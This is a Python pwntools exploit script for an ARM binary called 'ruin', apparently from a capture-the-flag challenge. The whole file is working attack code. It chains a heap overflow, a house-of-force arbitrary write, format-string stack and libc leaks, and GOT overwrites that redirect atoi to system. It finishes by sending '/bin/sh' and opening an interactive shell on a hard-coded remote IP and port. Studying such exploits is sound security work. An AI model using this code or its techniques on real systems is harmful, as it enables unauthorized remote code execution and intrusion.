#  exploit is not completely reliable
#  it could be necessary to run it 2/3
#  times to get it right

from pwn import *
from ctypes import c_int32

import re

# context.log_level = 'debug'
context.update(arch='arm', os='linux', endian='little')

BX_LR = 0x000086A4
ruin = ELF('./ruin')


class M32(object):
    _M32 = 0xffffffffL

    @staticmethod
    def m32(n):
        return n & M32._M32

    @staticmethod
    def add(a, b):
        return M32.m32(a+b)

    @staticmethod
    def sub(a, b):
        return M32.m32(a-b)


def menuchoice(r, c):
    r.sendline(str(c))
    return r.recv()
sendlen = menuchoice


def _16bitkey(r, key):
    assert len(key) <= 16

    menuchoice(r, 1)
    r.send(key.ljust(16, '\x00'))


def secret(r, secret):
    ''' this function contains the overflow
        8 byte malloc > 24 byte fgets '''

    assert len(secret) < 24
    # < because fgets reads at most n-1 bytes
    menuchoice(r, 2)
    r.sendline(secret)
    r.recvuntil('choice(1-4):')


def insertname(r, name, l):
    assert c_int32(l).value <= 32 and len(name) < 32
    sendlen(r, 3)

    menuchoice(r, l)
    r.sendline(name)


def choice(r, c):
    r.sendline(str(c))
    return r.recvuntil('choice(1-4):')  # 'select again!')


def leakfmt(r, fmt, isstr=None):
    # add some *a* to avoid choosing a menu voice
    leak = choice(r, fmt)
    if isstr is None:
        leak = re.findall('0x[0-9a-fA-F]{8}?|\(nil\)', leak)
        leak = [int(x, 16) if x != '(nil)' else 0 for x in leak]
    return leak


def leakstack(r, l):

    prog = log.progress('leaking using string fmt!')

    stack = [None]
    i = 1

    while(i < l):
        leak = leakfmt(r, ('%{}$010p'*2).format(i, i+1))
        stack.extend(leak)
        i += 2

    prog.success('leaked stack!')
    return stack


def houseofforce(r, where, what, av_top):
    payload = 'A'*12 + p32(0xffffffff) + '/bin/sh'
    payload = p32(0)*3 + p32(0xffffffff) + '\x00\x00\x00\x00\x00\x00\x00'
    assert len(payload) == 23

    secret(r, payload)

    evilsize = c_int32(
                    M32.sub(M32.sub(where, 8), av_top)
                    ).value

    assert evilsize < 0

    insertname(r, 'maybeshellcode', evilsize)

    _16bitkey(r, what)


secret_ptr = 0x00010FB4


def arbitrarywrite(r, where, what):
    # // | secret | name | _16bitkey
    payload = p32(0) + p32(secret_ptr-4) + p32(0) + p32(where)
    secret(r, payload)  # modify the 16bitkeyptr
    _16bitkey(r, what)


def arbitrarywrite_afterleak(r, where, what):
    # // | secret | name | _16bitkey

    payload = p32(0) + p32(secret_ptr-4) + p32(0) + p32(where)

    menuchoice(r, 'a')
    r.sendline(payload)
    r.recvuntil('choice(1-4):')

    menuchoice(r, '')
    r.send(what.ljust(16, '\x00'))


def stage1(r):
    r.recv()
    r.send('a'*8)
    res = r.recvuntil('again!')

    heap_addr = u32(res[8:].split(' is wrong')[0].ljust(4, '\x00'))
    top_chunk = heap_addr + 16

    log.success("leaked {:#x}, av top {:#x}".format(heap_addr, top_chunk))

    r.send('security')
    r.recvuntil('choice(1-4):')

    log.info(("trying to overwrite lower part of atoi"
              " {:#x} using secret ptr {:#x}").format(
              ruin.got['atoi']+2, secret_ptr))

    payload = p32(0) + p32(secret_ptr-4) + p32(0) + p32(0)
    houseofforce(r, secret_ptr, payload, top_chunk)  # recursive galore :)


def leakit(r):

    def leak(address):
        addr = c_int32(address).value
        r.sendline('{}\x00'.format(addr))
        if addr >= 0:
            r.recvuntil("long name ?!\n")

        res = r.recv()
        if res[-1] == '\n':
            res = res[:-1]

        if len(res) == 0:
            res = '\x00'
        return res

    stage1(r)
    # malloc | __libc_start_main | __imp_gmon_start | exit
    # let's set malloc to puts plt entry
    # keep the right value in r3 when exiting
    payload = p32(ruin.plt['puts']) + p32(BX_LR) + p32(BX_LR) + p32(0x8914)
    arbitrarywrite(r, ruin.got['malloc'], payload)

    # setbuf | printf | free | fgets
    # set up a loop to jump inside sign name function
    payload = p32(0x8574) + p32(BX_LR) + p32(BX_LR) + p32(0x000088EC)
    arbitrarywrite(r, ruin.got['setbuf']-8, payload)

    p = log.progress('leaking libc plz wait!')
    leakedgot = leak(ruin.got['atoi'])
    symb = u32(leakedgot[:4])

    dynelf = DynELF(leak, symb)
    p.success('libc leaked!')

    results = {}
    for sym in ruin.got.iterkeys():
        results[sym] = dynelf.lookup(sym)

    results['system'] = dynelf.lookup('system')

    return (dynelf.libbase, results)


def pwnit(r, libc):
    stage1(r)

    # malloc | __libc_start_main | __imp_gmon_start | exit
    # let's set malloc to puts plt entry
    payload = p32(ruin.plt['printf']) + p32(BX_LR) + p32(BX_LR) + p32(BX_LR)
    arbitrarywrite(r, ruin.got['atoi'], payload)

    r.recvuntil('choice(1-4):')
    stack = leakstack(r, 200)

    # analyzing stack content

    idx = stack.index(0x10f74)

    gotaddr = leakfmt(r, '%{}$#010x'.format(idx))[0]
    assert gotaddr == 0x10f74

    leaked_got = leakfmt(r, '%{}$s'.format(idx), True)
    gotentry = u32(leaked_got[0:4])

    log.success('leaked got entry: {:#x}'.format(gotentry))

    __libc_start_main = libc[1]['__libc_start_main'] - libc[0]
    libc_base = gotentry - __libc_start_main
    system_addr = libc[1]['system'] - libc[0]
    system_addr += libc_base

    payload = p32(system_addr) + p32(BX_LR) + p32(BX_LR) + p32(BX_LR)
    arbitrarywrite_afterleak(r, ruin.got['atoi'], payload)

    log.success('overwritten atoi got entry {:#x}: {:#x}'.format(
        ruin.got['atoi'], system_addr))
    r.recvuntil('choice(1-4):')
    r.sendline('/bin/sh\x00')
    r.interactive()


def main():

    r = remote('166.111.132.49', 9999)
    libc = leakit(r)
    r.close()

    r = remote('166.111.132.49', 9999)
    pwnit(r, libc)
    r.close()


if __name__ == "__main__":
    main()
